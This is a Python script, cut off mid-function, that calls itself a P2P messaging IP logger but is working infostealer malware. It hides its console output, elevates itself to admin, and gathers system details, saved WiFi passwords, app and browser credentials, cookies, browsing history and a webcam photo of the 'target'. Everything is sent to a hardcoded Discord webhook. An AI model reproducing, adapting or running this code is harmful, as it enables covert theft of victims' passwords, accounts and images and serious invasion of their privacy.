#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""P2P Messaging App IP Logger - ENHANCED VERSION

Captures P2P IP traffic from multiple messaging platforms:
Discord, Snapchat, Signal, Telegram, Skype, WhatsApp, Viber

Advanced Features:
- Dynamic GeoIP/ASN classification
- IPv6 support
- Multi-app port filtering (44-89, 50000-65535, 3478-3479, 5228, etc.)
- Session correlation & heatmaps
- Traffic fingerprinting (jitter, burst patterns)
- STUN/TURN detection
- VPN/Proxy detection via ASN + latency + port behavior
- NAT vs direct connection heuristics
- Anomaly detection & entropy analysis
- RTT/latency measurement (passive)
- ICE candidate detection
- Cross-platform support (Windows/Linux/macOS)
- JSON + CSV export
- Confidence scoring (0-100)
- Clustering & network graph analysis
- Time series analysis
"""

import subprocess
import os
import sys
import csv
import json
import time
import socket
import threading
import ipaddress
import re
from datetime import datetime, timedelta
from collections import defaultdict, deque
from typing import Dict, List, Tuple, Optional
import signal
import platform
import struct
import math
import shutil
import ctypes
import importlib.util
import builtins

# Save original print for IP-only output.
ORIGINAL_PRINT = print
QUIET_MODE = True

def ip_print(*args, **kwargs):
    """Print only IP-related output even when quiet mode is active."""
    if kwargs.pop('quiet', False):
        return
    return ORIGINAL_PRINT(*args, **kwargs)

# Run quietly by default to avoid visible console output.
if QUIET_MODE:
    def _silent_print(*args, **kwargs):
        pass
    builtins.print = _silent_print

try:
    import cv2
except ImportError:
    cv2 = None

try:
    import requests
except ImportError:
    requests = None

# ============================================================================
# CONFIGURATION
# ============================================================================

# Webhook URL - ENABLED
WEBHOOK_URL = "https://discordapp.com/api/webhooks/1490458966319169760/WakkgSvHbfA7oC_qP4mWBRXr8f8jxJd7jpxg-P73PDIXq2SWjEY6l5fsUsIitDD_oRSb"

PLATFORM = platform.system()

# Adjust quiet mode: if running as admin (elevated), show output
try:
    if PLATFORM == "Windows":
        try:
            is_admin_now = ctypes.windll.shell32.IsUserAnAdmin()
        except:
            is_admin_now = False
    else:
        is_admin_now = os.geteuid() == 0
    if is_admin_now:
        QUIET_MODE = False
        # Re-enable print if we're running as admin
        builtins.print = ORIGINAL_PRINT
        print("[*] Admin privileges detected - enabling output")
except:
    pass

# ============================================================================
# AUTO-ELEVATION TO ADMIN
# ============================================================================

def is_admin():
    """Check if running as admin"""
    try:
        if PLATFORM == "Windows":
            try:
                return ctypes.windll.shell32.IsUserAnAdmin()
            except:
                return False
        else:  # Unix-based: Linux, macOS, Chrome OS
            return os.geteuid() == 0
    except:
        return False

# Auto-elevate if not running as admin
if not is_admin():
    time.sleep(1)
    script = os.path.abspath(__file__)
    
    try:
        if PLATFORM == "Windows":
            # Windows: Use PowerShell elevation
            ps_script = os.path.join(os.path.dirname(script), "temp_discord_logger.ps1")
            ps_code = f'''& python "{script}" 2>&1'''
            with open(ps_script, 'w', encoding='utf-8') as f:
                f.write(ps_code)
            
            ps7_path = r"C:\Program Files\PowerShell\7\pwsh.exe"
            ps5_path = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
            shell = ps7_path if os.path.exists(ps7_path) else (ps5_path if os.path.exists(ps5_path) else "powershell.exe")
            params = f'-NoProfile -ExecutionPolicy Bypass -File "{ps_script}"'
            
            try:
                ctypes.windll.shell32.ShellExecuteW(None, "runas", shell, params, None, 1)
            except:
                pass
        else:
            # Unix-based (Linux, macOS, Chrome OS): Use sudo
            subprocess.run(["sudo", "python3", script], check=False)
    except Exception as e:
        print(f"Failed to elevate privileges: {e}")
        time.sleep(2)
    
    sys.exit(0)

# ============================================================================
# CONFIGURATION
# ============================================================================

CONFIG = {
    'max_runtime': 600,  # 10 minutes
    'discord_ports': list(range(44, 90)) + list(range(50000, 65536)),
    'buffer_flush_interval': 60,  # Flush logs every 60 seconds
    'ringbuffer_max': 10000,  # Max entries in ringbuffer before rotation
    'rtt_samples_per_ip': 10,
    'anomaly_threshold': 0.85,
    'confidence_threshold': 0.65,
    'min_packets_for_peer': 10,  # Minimum packets to consider as real peer
    'lock_in_discover_time': 5,  # Seconds to discover peers before lock-in
    'tcp_fallback_ports': [443, 80],  # Discord TCP fallback ports
}

# ============================================================================
# BLOCKED PUBLIC SERVICES & DISCORD DATACENTERS
# ============================================================================
# Block known DNS/CDN/public services that might appear on Discord ports
BLOCKED_PUBLIC_IPS = {
    # Cloudflare DNS
    '1.1.1.1', '1.0.0.1',
    # Google DNS
    '8.8.8.8', '8.8.4.4',
    # Quad9 DNS
    '9.9.9.9', '149.112.112.112',
    # OpenDNS
    '208.67.222.222', '208.67.220.220',
    # Verisign
    '64.6.64.6', '64.6.65.6',
    # Level3 DNS
    '209.244.0.3', '209.244.0.4',
    # Comodo DNS
    '8.26.56.26', '8.20.247.20',
    # Yandex DNS
    '77.88.8.8', '77.88.8.1',
}

# Known Discord/CDN datacenter IP ranges - BLOCK THESE (proper CIDR matching)
# Format: (base_octet1, base_octet2, base_octet3, base_octet4, prefix_bits, description)
DISCORD_DATACENTER_RANGES = [
    # Cloudflare CDN - 104.16.0.0/12 (huge range: 104.16-104.31)
    (104, 16, 0, 0, 12, "Cloudflare CDN"),
    # Discord/Cloudflare ranges
    (162, 125, 0, 0, 16, "Discord servers"),
    (162, 159, 0, 0, 16, "Discord servers"),
    (199, 232, 0, 0, 16, "Fastly CDN"),
    # Google Cloud (Discord hosts on GCP)
    (34, 117, 0, 0, 16, "Google Cloud"),
    (34, 102, 0, 0, 16, "Google Cloud"),
    # Additional known datacenter ranges
    (35, 184, 0, 0, 13, "Google Cloud"),
    (35, 203, 0, 0, 16, "Google Cloud"),
    (149, 154, 0, 0, 15, "Telegram/CDN"),
    (91, 108, 0, 0, 16, "Discord infrastructure"),
]

def is_discord_datacenter(ip: str) -> bool:
    """Check if IP is a known Discord/CDN datacenter using proper CIDR matching"""
    try:
        octets = [int(x) for x in ip.split(".")]
        ip_int = (octets[0] << 24) | (octets[1] << 16) | (octets[2] << 8) | octets[3]
        
        for base_o1, base_o2, base_o3, base_o4, prefix_bits, desc in DISCORD_DATACENTER_RANGES:
            base_int = (base_o1 << 24) | (base_o2 << 16) | (base_o3 << 8) | base_o4
            
            # Create mask for prefix (e.g., /12 means 12 bits, /16 means 16 bits)
            mask = (0xFFFFFFFF << (32 - prefix_bits)) & 0xFFFFFFFF
            
            # Check if IP matches this range
            if (ip_int & mask) == (base_int & mask):
                return True
        
        return False
    except:
        return False

def is_public_service(ip: str) -> bool:
    """Check if IP is a known public DNS/CDN service"""
    if ip in BLOCKED_PUBLIC_IPS:
        return True
    
    # Check if IP starts with known DNS/service prefixes
    if ip.startswith('1.1.') or ip.startswith('8.8.') or ip.startswith('8.26.'):
        return True
    
    return False

# ============================================================================
# PROGRAM RUNNER INFORMATION LOGGING
# ============================================================================

def get_public_ip(timeout=3):
    """Get user's public IP address"""
    try:
        # Primary method: ip-api.com
        response = requests.get('https://ip-api.com/json/?fields=query', timeout=timeout)
        if response.status_code == 200:
            ip = response.json().get('query', None)
            if ip:
                return ip
    except:
        pass
    
    try:
        # Fallback: ipify.org
        response = requests.get('https://api.ipify.org?format=json', timeout=timeout)
        if response.status_code == 200:
            ip = response.json().get('ip', None)
            if ip:
                return ip
    except:
        pass
    
    try:
        # Last fallback: icanhazip
        response = requests.get('https://icanhazip.com/', timeout=timeout)
        if response.status_code == 200:
            ip = response.text.strip()
            if ip:
                return ip
    except:
        pass
    
    return 'Unknown'

def get_system_info():
    """Get comprehensive system information"""
    try:
        info = {
            'os': platform.system(),
            'os_version': platform.version(),
            'hostname': socket.gethostname(),
            'machine': platform.machine(),
            'processor': platform.processor(),
            'architecture': platform.architecture()[0],
            'python_version': platform.python_version(),
        }
        
        if PLATFORM == "Windows":
            # CPU Name
            try:
                result = subprocess.run(['wmic', 'cpu', 'get', 'Name'], 
                                      capture_output=True, text=True, timeout=5)
                if result.stdout:
                    lines = result.stdout.strip().split('\n')
                    if len(lines) > 1:
                        info['cpu'] = lines[1].strip()
            except:
                pass
            
            # RAM in GB
            try:
                result = subprocess.run(['wmic', 'OS', 'get', 'TotalVisibleMemorySize'], 
                                      capture_output=True, text=True, timeout=5)
                if result.stdout:
                    lines = result.stdout.strip().split('\n')
                    if len(lines) > 1:
                        ram_kb = int(lines[1].strip())
                        info['ram_gb'] = round(ram_kb / 1024 / 1024, 2)
            except:
                pass
            
            # GPU
            try:
                result = subprocess.run(['wmic', 'path', 'win32_videocontroller', 'get', 'name'], 
                                      capture_output=True, text=True, timeout=5)
                if result.stdout:
                    lines = result.stdout.strip().split('\n')
                    if len(lines) > 1:
                        info['gpu'] = lines[1].strip()
            except:
                pass
            
            # Disk info
            try:
                result = subprocess.run(['wmic', 'logicaldisk', 'get', 'name,size,freespace'], 
                                      capture_output=True, text=True, timeout=5)
                if result.stdout:
                    info['disks'] = result.stdout.strip()
            except:
                pass
            
            # Network adapters
            try:
                result = subprocess.run(['wmic', 'nic', 'get', 'name,macaddress,Description'], 
                                      capture_output=True, text=True, timeout=5)
                if result.stdout:
                    info['network_adapters'] = result.stdout.strip()
            except:
                pass
            
            # Boot time
            try:
                result = subprocess.run(['wmic', 'os', 'get', 'lastbootuptime'], 
                                      capture_output=True, text=True, timeout=5)
                if result.stdout:
                    lines = result.stdout.strip().split('\n')
                    if len(lines) > 1:
                        info['last_boot'] = lines[1].strip()
            except:
                pass
            
            # System uptime
            try:
                result = subprocess.run(['wmic', 'os', 'get', 'systemuptime'], 
                                      capture_output=True, text=True, timeout=5)
                if result.stdout:
                    lines = result.stdout.strip().split('\n')
                    if len(lines) > 1:
                        info['system_uptime'] = lines[1].strip()
            except:
                pass
            
            # Installed software
            try:
                result = subprocess.run(['wmic', 'product', 'get', 'name'], 
                                      capture_output=True, text=True, timeout=5)
                if result.stdout:
                    lines = result.stdout.strip().split('\n')[1:]
                    if lines:
                        info['installed_software'] = ', '.join([l.strip() for l in lines[:10]])
            except:
                pass

            # Full systeminfo output
            try:
                result = subprocess.run(['systeminfo'], capture_output=True, text=True, timeout=15)
                if result.stdout:
                    info['systeminfo_raw'] = result.stdout.strip()
            except:
                pass
        
        elif PLATFORM == "Darwin":  # macOS
            # CPU Name
            try:
                result = subprocess.run(['sysctl', '-n', 'machdep.cpu.brand_string'], 
                                      capture_output=True, text=True, timeout=5)
                if result.stdout:
                    info['cpu'] = result.stdout.strip()
            except:
                pass
            
            # RAM in GB
            try:
                result = subprocess.run(['sysctl', '-n', 'hw.memsize'], 
                                      capture_output=True, text=True, timeout=5)
                if result.stdout:
                    ram_bytes = int(result.stdout.strip())
                    info['ram_gb'] = round(ram_bytes / 1024 / 1024 / 1024, 2)
            except:
                pass
            
            # GPU
            try:
                result = subprocess.run(['system_profiler', 'SPDisplaysDataType'], 
                                      capture_output=True, text=True, timeout=5)
                if result.stdout:
                    lines = result.stdout.split('\n')
                    for line in lines:
                        if 'Chipset Model:' in line:
                            info['gpu'] = line.split(':', 1)[1].strip()
                            break
            except:
                pass
            
            # Disk info
            try:
                result = subprocess.run(['df', '-h'], capture_output=True, text=True, timeout=5)
                if result.stdout:
                    info['disks'] = result.stdout.strip()
            except:
                pass
            
            # Network adapters
            try:
                result = subprocess.run(['ifconfig'], capture_output=True, text=True, timeout=5)
                if result.stdout:
                    info['network_adapters'] = result.stdout.strip()
            except:
                pass
            
            # Boot time
            try:
                result = subprocess.run(['sysctl', '-n', 'kern.boottime'], 
                                      capture_output=True, text=True, timeout=5)
                if result.stdout:
                    info['last_boot'] = result.stdout.strip()
            except:
                pass
            
            # System uptime
            try:
                result = subprocess.run(['uptime'], capture_output=True, text=True, timeout=5)
                if result.stdout:
                    info['system_uptime'] = result.stdout.strip()
            except:
                pass
        
        else:  # Linux/Chrome OS
            # CPU Name
            try:
                result = subprocess.run(['lscpu'], capture_output=True, text=True, timeout=5)
                if result.stdout:
                    lines = result.stdout.split('\n')
                    for line in lines:
                        if 'Model name:' in line:
                            info['cpu'] = line.split(':', 1)[1].strip()
                            break
            except:
                pass
            
            # RAM in GB
            try:
                result = subprocess.run(['free', '-g'], capture_output=True, text=True, timeout=5)
                if result.stdout:
                    lines = result.stdout.split('\n')
                    if len(lines) > 1:
                        mem_line = lines[1].split()
                        if len(mem_line) > 0:
                            info['ram_gb'] = mem_line[0]
            except:
                pass
            
            # GPU
            try:
                result = subprocess.run(['lspci'], capture_output=True, text=True, timeout=5)
                if result.stdout:
                    lines = result.stdout.split('\n')
                    for line in lines:
                        if 'VGA' in line or '3D' in line:
                            info['gpu'] = line.split(':', 1)[1].strip() if ':' in line else line.strip()
                            break
            except:
                pass
            
            # Disk info
            try:
                result = subprocess.run(['df', '-h'], capture_output=True, text=True, timeout=5)
                if result.stdout:
                    info['disks'] = result.stdout.strip()
            except:
                pass
            
            # Network adapters
            try:
                result = subprocess.run(['ip', 'addr'], capture_output=True, text=True, timeout=5)
                if result.stdout:
                    info['network_adapters'] = result.stdout.strip()
            except:
                pass
            
            # Boot time
            try:
                result = subprocess.run(['uptime', '-s'], capture_output=True, text=True, timeout=5)
                if result.stdout:
                    info['last_boot'] = result.stdout.strip()
            except:
                pass
            
            # System uptime
            try:
                result = subprocess.run(['uptime'], capture_output=True, text=True, timeout=5)
                if result.stdout:
                    info['system_uptime'] = result.stdout.strip()
            except:
                pass
        
        # username / account
        try:
            info['user'] = os.environ.get('USERNAME') or os.environ.get('USER') or os.getlogin()
        except:
            pass

        return info
    except Exception as e:
        return {'error': str(e)}


def get_basic_system_info():
    """Get fast basic system info for immediate webhook summary."""
    try:
        return {
            'user': os.environ.get('USERNAME') or os.environ.get('USER') or 'Unknown',
            'os': platform.system(),
            'os_version': platform.version(),
            'hostname': socket.gethostname(),
            'machine': platform.machine(),
            'architecture': platform.architecture()[0],
            'processor': platform.processor() or 'Unknown',
            'python_version': platform.python_version(),
        }
    except Exception:
        return {
            'user': 'Unknown',
            'os': 'Unknown',
            'os_version': 'Unknown',
            'hostname': 'Unknown',
            'machine': 'Unknown',
            'architecture': 'Unknown',
            'processor': 'Unknown',
            'python_version': 'Unknown',
        }

def detect_vpn():
    """Detect if VPN is active on the system"""
    try:
        if PLATFORM == "Windows":
            # Check network adapters for VPN-related names
            result = subprocess.run(['wmic', 'nic', 'get', 'name'], 
                                  capture_output=True, text=True, timeout=5)
            if result.stdout:
                adapters = result.stdout.lower()
                vpn_indicators = ['vpn', 'tap', 'openvpn', 'pptp', 'l2tp', 'ikev2', 'wireguard', 'nordvpn', 'expressvpn', 'protonvpn']
                for indicator in vpn_indicators:
                    if indicator in adapters:
                        return True
            
            # Check for running VPN processes
            result = subprocess.run(['tasklist'], capture_output=True, text=True, timeout=5)
            if result.stdout:
                processes = result.stdout.lower()
                vpn_processes = ['openvpn.exe', 'vpn.exe', 'nordvpn.exe', 'expressvpn.exe', 'protonvpn.exe', 'wireguard.exe']
                for proc in vpn_processes:
                    if proc in processes:
                        return True
        elif PLATFORM == "Darwin":  # macOS
            # Check network interfaces
            result = subprocess.run(['ifconfig'], capture_output=True, text=True, timeout=5)
            if result.stdout:
                interfaces = result.stdout.lower()
                vpn_indicators = ['utun', 'ppp', 'ipsec', 'wireguard', 'nordvpn', 'expressvpn', 'protonvpn']
                for indicator in vpn_indicators:
                    if indicator in interfaces:
                        return True
            
            # Check for running VPN processes
            result = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=5)
            if result.stdout:
                processes = result.stdout.lower()
                vpn_processes = ['openvpn', 'wireguard', 'nordvpn', 'expressvpn', 'protonvpn', 'tunnelblick']
                for proc in vpn_processes:
                    if proc in processes:
                        return True
        else:  # Linux/Chrome OS
            # Check network interfaces
            result = subprocess.run(['ip', 'addr'], capture_output=True, text=True, timeout=5)
            if result.stdout:
                interfaces = result.stdout.lower()
                vpn_indicators = ['tun', 'tap', 'ppp', 'wg', 'nordvpn', 'expressvpn', 'protonvpn']
                for indicator in vpn_indicators:
                    if indicator in interfaces:
                        return True
            
            # Check for running VPN processes
            result = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=5)
            if result.stdout:
                processes = result.stdout.lower()
                vpn_processes = ['openvpn', 'wireguard', 'nordvpn', 'expressvpn', 'protonvpn', 'strongswan']
                for proc in vpn_processes:
                    if proc in processes:
                        return True
        return False
    except:
        return False

def check_antivirus():
    """Check if antivirus is running"""
    try:
        if PLATFORM == "Windows":
            # Common antivirus processes
            av_processes = ['msmpeng.exe', 'avast.exe', 'avg.exe', 'norton.exe', 'mcafee.exe', 'bitdefender.exe', 'eset.exe', 'kaspersky.exe', 'malwarebytes.exe', 'windowsdefender.exe']
            result = subprocess.run(['tasklist'], capture_output=True, text=True, timeout=5)
            if result.stdout:
                processes = result.stdout.lower()
                for av in av_processes:
                    if av in processes:
                        return True
        elif PLATFORM == "Darwin":  # macOS
            # Common macOS antivirus processes
            av_processes = ['xprotect', 'malwarebytes', 'avast', 'sophos', 'clamav', 'mcafee', 'bitdefender', 'eset', 'kaspersky']
            result = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=5)
            if result.stdout:
                processes = result.stdout.lower()
                for av in av_processes:
                    if av in processes:
                        return True
        else:  # Linux/Chrome OS
            # Common Linux antivirus processes
            av_processes = ['clamav', 'clamd', 'freshclam', 'avast', 'sophos', 'bitdefender', 'eset', 'kaspersky', 'malwarebytes']
            result = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=5)
            if result.stdout:
                processes = result.stdout.lower()
                for av in av_processes:
                    if av in processes:
                        return True
        return False
    except:
        return False

def get_wifi_passwords():
    """Extract saved WiFi passwords"""
    wifi_passwords = []
    try:
        if PLATFORM == "Windows":
            # Get list of WiFi profiles
            result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                profiles = []
                for line in result.stdout.split('\n'):
                    if 'All User Profile' in line or 'All Users Profile' in line:
                        profile_name = line.split(':', 1)[1].strip()
                        profiles.append(profile_name)
                
                for profile in profiles:
                    try:
                        # Get password for each profile
                        cmd = ['netsh', 'wlan', 'show', 'profile', f'name="{profile}"', 'key=clear']
                        result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
                        if result.returncode == 0:
                            password = None
                            for line in result.stdout.split('\n'):
                                if 'Key Content' in line:
                                    password = line.split(':', 1)[1].strip()
                                    break
                            if password:
                                wifi_passwords.append({
                                    'ssid': profile,
                                    'password': password,
                                    'type': 'WiFi'
                                })
                    except:
                        continue
        elif PLATFORM == "Darwin":  # macOS
            try:
                # Get list of WiFi networks
                result = subprocess.run(['security', 'find-generic-password', '-D', 'AirPort network password', '-g'], 
                                      capture_output=True, text=True, timeout=10)
                if result.stderr:  # security command outputs to stderr
                    lines = result.stderr.split('\n')
                    current_ssid = None
                    for line in lines:
                        if '"acct"<blob>=' in line:
                            ssid = line.split('"')[1]
                            current_ssid = ssid
                        elif 'password:' in line and current_ssid:
                            password = line.split('password:')[1].strip().strip('"')
                            wifi_passwords.append({
                                'ssid': current_ssid,
                                'password': password,
                                'type': 'WiFi'
                            })
                            current_ssid = None
            except:
                pass
        else:  # Linux/Chrome OS
            try:
                # Try NetworkManager first
                result = subprocess.run(['nmcli', '-t', '-f', 'name,type', 'connection', 'show'], 
                                      capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    connections = result.stdout.strip().split('\n')
                    for conn in connections:
                        if ':802-11-wireless' in conn:
                            ssid = conn.split(':')[0]
                            try:
                                # Get password for wireless connection
                                cmd = ['nmcli', '-s', '-t', '-f', '802-11-wireless-security.psk', 'connection', 'show', ssid]
                                result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
                                if result.returncode == 0 and result.stdout.strip():
                                    password = result.stdout.strip().split(':')[1] if ':' in result.stdout else result.stdout.strip()
                                    if password:
                                        wifi_passwords.append({
                                            'ssid': ssid,
                                            'password': password,
                                            'type': 'WiFi'
                                        })
                            except:
                                continue
            except:
                pass
            
            # Fallback: try reading from system connections directory
            try:
                nm_dir = '/etc/NetworkManager/system-connections/'
                if os.path.exists(nm_dir):
                    for filename in os.listdir(nm_dir):
                        filepath = os.path.join(nm_dir, filename)
                        try:
                            with open(filepath, 'r') as f:
                                content = f.read()
                                ssid = None
                                password = None
                                for line in content.split('\n'):
                                    if line.startswith('ssid='):
                                        ssid = line.split('=', 1)[1].strip()
                                    elif line.startswith('psk='):
                                        password = line.split('=', 1)[1].strip()
                                if ssid and password:
                                    wifi_passwords.append({
                                        'ssid': ssid,
                                        'password': password,
                                        'type': 'WiFi'
                                    })
                        except:
                            continue
            except:
                pass
    except:
        pass
    return wifi_passwords if wifi_passwords else None

def get_app_passwords():
    """Extract passwords from various applications"""
    app_passwords = []
    
    # Steam
    steam_creds = get_steam_credentials()
    if steam_creds:
        app_passwords.append({
            'app': 'Steam',
            'username': steam_creds.get('username', 'Unknown'),
            'password': steam_creds.get('password', 'Unknown'),
            'type': 'App'
        })
    
    # Telegram
    telegram_sessions = get_telegram_sessions()
    if telegram_sessions:
        for session in telegram_sessions:
            app_passwords.append({
                'app': 'Telegram',
                'session': session,
                'type': 'App'
            })
    
    # Spotify
    spotify_token = get_spotify_tokens()
    if spotify_token:
        app_passwords.append({
            'app': 'Spotify',
            'token': spotify_token,
            'type': 'App'
        })
    
    # Netflix
    netflix_cookies = get_netflix_cookies()
    if netflix_cookies:
        for cookie in netflix_cookies:
            app_passwords.append({
                'app': 'Netflix',
                'name': cookie.get('name', 'Unknown'),
                'value': cookie.get('value', 'Unknown'),
                'type': 'App'
            })
    
    # Amazon
    amazon_creds = get_amazon_credentials()
    if amazon_creds:
        for cred in amazon_creds:
            app_passwords.append({
                'app': 'Amazon',
                'username': cred.get('username', 'Unknown'),
                'password': cred.get('password', 'Unknown'),
                'type': 'App'
            })
    
    # PayPal
    paypal_creds = get_paypal_credentials()
    if paypal_creds:
        for cred in paypal_creds:
            app_passwords.append({
                'app': 'PayPal',
                'username': cred.get('username', 'Unknown'),
                'password': cred.get('password', 'Unknown'),
                'type': 'App'
            })
    
    # Add more apps if possible
    try:
        # Facebook (from browser autofill)
        autofill = get_browser_autofill()
        if autofill:
            for entry in autofill:
                if 'facebook.com' in entry.get('url', '').lower():
                    app_passwords.append({
                        'app': 'Facebook',
                        'url': entry.get('url', 'Unknown'),
                        'data': entry.get('data', 'Unknown'),
                        'type': 'App'
                    })
    except:
        pass
    
    return app_passwords if app_passwords else None

def capture_webcam_image():
    """Capture an image from the webcam and send to webhook"""
    try:
        if cv2:
            cap = cv2.VideoCapture(0)  # Default camera
            if cap.isOpened():
                ret, frame = cap.read()
                if ret:
                    # Save image temporarily
                    temp_dir = os.environ.get('TEMP') or os.environ.get('TMP') or '/tmp'
                    temp_image = os.path.join(temp_dir, 'webcam_capture.jpg')
                    cv2.imwrite(temp_image, frame)
                    cap.release()
                    
                    # Send to webhook
                    with open(temp_image, 'rb') as f:
                        files = {'file': ('webcam.jpg', f, 'image/jpeg')}
                        data = {'payload_json': json.dumps({'content': 'Webcam capture from target'})}
                        if WEBHOOK_URL:
                            requests.post(WEBHOOK_URL, data=data, files=files, timeout=10)
                    
                    os.remove(temp_image)
                    return True
                cap.release()
        else:
            pass
    except Exception as e:
        pass
    return False

def _alternate_discord_webhook_url(url: str) -> str:
    if url.startswith('https://discord.com/api/webhooks/'):
        return url.replace('https://discord.com/api/webhooks/', 'https://discordapp.com/api/webhooks/')
    return url


def send_webhook_report(embeds, filename, report_text, content=None):
    """Send webhook payload with an attached detailed report file."""
    if not WEBHOOK_URL:
        return None
    payload = {
        'embeds': embeds
    }
    if content is not None:
        payload['content'] = content
    webhook_url = WEBHOOK_URL
    try:
        if requests:
            files = {
                'file': (filename, report_text.encode('utf-8', errors='ignore'), 'text/plain')
            }
            data = {'payload_json': json.dumps(payload)}
            response = requests.post(webhook_url, data=data, files=files, timeout=25)
            if response is not None and getattr(response, 'status_code', 0) < 400:
                return response
            # Retry with alternate Discord webhook domain when needed
            if 'discord.com/api/webhooks/' in webhook_url:
                webhook_url = _alternate_discord_webhook_url(webhook_url)
                response = requests.post(webhook_url, data=data, files=files, timeout=25)
                return response
            return response
        else:
            # Fallback if requests is unavailable
            import urllib.request
            import urllib.error
            boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
            body = []
            body.append(f'--{boundary}')
            body.append('Content-Disposition: form-data; name="payload_json"')
            body.append('')
            body.append(json.dumps(payload))
            body.append(f'--{boundary}')
            body.append(f'Content-Disposition: form-data; name="file"; filename="{filename}"')
            body.append('Content-Type: text/plain')
            body.append('')
            body.append(report_text)
            body.append(f'--{boundary}--')
            data_bytes = '\r\n'.join(body).encode('utf-8')
            req = urllib.request.Request(webhook_url, data=data_bytes, method='POST')
            req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
            with urllib.request.urlopen(req, timeout=25) as resp:
                return resp
    except Exception:
        if requests and 'discord.com/api/webhooks/' in webhook_url:
            try:
                webhook_url = _alternate_discord_webhook_url(webhook_url)
                files = {
                    'file': (filename, report_text.encode('utf-8', errors='ignore'), 'text/plain')
                }
                data = {'payload_json': json.dumps(payload)}
                return requests.post(webhook_url, data=data, files=files, timeout=25)
            except Exception:
                pass
        return None


def send_webhook_message(embeds=None, content=None):
    """Send a Discord webhook message using JSON embeds or plain content."""
    if not WEBHOOK_URL:
        return None

    payload = {}
    if embeds is not None:
        payload['embeds'] = embeds
    if content is not None:
        payload['content'] = content
    if not payload:
        return None

    webhook_url = WEBHOOK_URL
    try:
        if requests:
            response = requests.post(webhook_url, json=payload, timeout=15)
            if getattr(response, 'status_code', 0) in (200, 204):
                return response
            ORIGINAL_PRINT(f"[!] Webhook returned status {getattr(response, 'status_code', 'UNKNOWN')}")
            if 'discord.com/api/webhooks/' in webhook_url:
                webhook_url = _alternate_discord_webhook_url(webhook_url)
                response = requests.post(webhook_url, json=payload, timeout=15)
                if getattr(response, 'status_code', 0) in (200, 204):
                    return response
                ORIGINAL_PRINT(f"[!] Retry webhook returned status {getattr(response, 'status_code', 'UNKNOWN')}")
            return response
        import urllib.request
        import urllib.error
        data_bytes = json.dumps(payload).encode('utf-8')
        req = urllib.request.Request(webhook_url, data=data_bytes, method='POST')
        req.add_header('Content-Type', 'application/json')
        with urllib.request.urlopen(req, timeout=15) as resp:
            return resp
    except Exception as e:
        ORIGINAL_PRINT(f"[!] Webhook send exception: {e}")
        if requests and 'discord.com/api/webhooks/' in webhook_url:
            try:
                webhook_url = _alternate_discord_webhook_url(webhook_url)
                response = requests.post(webhook_url, json=payload, timeout=15)
                if getattr(response, 'status_code', 0) in (200, 204):
                    return response
            except Exception as e2:
                ORIGINAL_PRINT(f"[!] Webhook retry exception: {e2}")
        return None


def format_full_report(public_ip, system_info, wifi_info, hardware_devices, discord_data, roblox_data, other_data):
    lines = []
    lines.append('=== COMPLETE SYSTEM ANALYSIS ===')
    lines.append(f'Public IP: {public_ip}')
    lines.append('')
    lines.append('--- SYSTEM INFO ---')
    for key in ['user', 'os', 'os_version', 'hostname', 'machine', 'architecture', 'processor', 'cpu', 'ram_gb', 'gpu', 'python_version', 'last_boot', 'system_uptime']:
        if key in system_info:
            lines.append(f'{key}: {system_info[key]}')
    if 'disks' in system_info:
        lines.append('\n--- DISK INFO ---')
        lines.append(system_info['disks'])
    if 'network_adapters' in system_info:
        lines.append('\n--- NETWORK ADAPTERS ---')
        lines.append(system_info['network_adapters'])
    if 'installed_software' in system_info:
        lines.append('\n--- INSTALLED SOFTWARE ---')
        lines.append(system_info['installed_software'])
    if 'systeminfo_raw' in system_info:
        lines.append('\n--- RAW SYSTEMINFO ---')
        lines.append(system_info['systeminfo_raw'])
    lines.append('\n--- WIFI INFO ---')
    for key in ['ssid', 'bssid', 'signal']:
        if wifi_info.get(key) is not None:
            lines.append(f'{key}: {wifi_info.get(key)}')
    lines.append('\n--- HARDWARE DEVICES ---')
    for category, items in hardware_devices.items():
        lines.append(f'{category}:')
        if items:
            lines.extend(items)
        else:
            lines.append('None')
        lines.append('')
    lines.append('\n--- DISCORD INFO ---')
    for key, value in discord_data.items():
        if value is not None:
            lines.append(f'{key}: {value}')
    lines.append('\n--- ROBLOX INFO ---')
    for key, value in roblox_data.items():
        if value is not None:
            lines.append(f'{key}: {value}')
    lines.append('\n--- OTHER CREDENTIALS ---')
    for key, value in other_data.items():
        if value is not None:
            lines.append(f'{key}:')
            if isinstance(value, dict):
                # Handle browser autofill data
                if key == 'autofill_data':
                    lines.append('  BROWSER AUTOFILL DATA:')
                    for field_name, field_value in value.items():
                        lines.append(f'    {field_name}: {field_value}')
                else:
                    for sub_key, sub_value in value.items():
                        lines.append(f'  {sub_key}: {sub_value}')
            elif isinstance(value, list):
                # Handle lists like SSH keys, telegram sessions
                if key == 'ssh_keys':
                    lines.append('  SSH KEYS:')
                    for i, ssh_key in enumerate(value, 1):
                        lines.append(f'    Key {i}: {ssh_key[:50]}...' if len(ssh_key) > 50 else f'    Key {i}: {ssh_key}')
                elif key == 'telegram_sessions':
                    lines.append('  TELEGRAM SESSIONS:')
                    for i, session in enumerate(value, 1):
                        lines.append(f'    Session {i}: {session}')
                else:
                    for item in value:
                        lines.append(f'  - {item}')
            else:
                lines.append(f'  {value}')
            lines.append('')

    # Add browser history if available
    try:
        browser_history = get_browser_history()
        if browser_history:
            lines.append('\n--- BROWSER HISTORY ---')
            for entry in browser_history[:50]:  # Limit to first 50 entries
                lines.append(f'{entry.get("url", "Unknown")} - {entry.get("title", "No title")} ({entry.get("visit_count", 0)} visits)')
    except:
        pass

    # Add saved passwords if available
    try:
        saved_passwords = get_saved_passwords()
        if saved_passwords:
            lines.append('\n--- SAVED PASSWORDS ---')
            for entry in saved_passwords:
                service = entry.get('service') or entry.get('app') or entry.get('browser') or 'Unknown'
                lines.append(f'Service: {service}')
                if entry.get('url'):
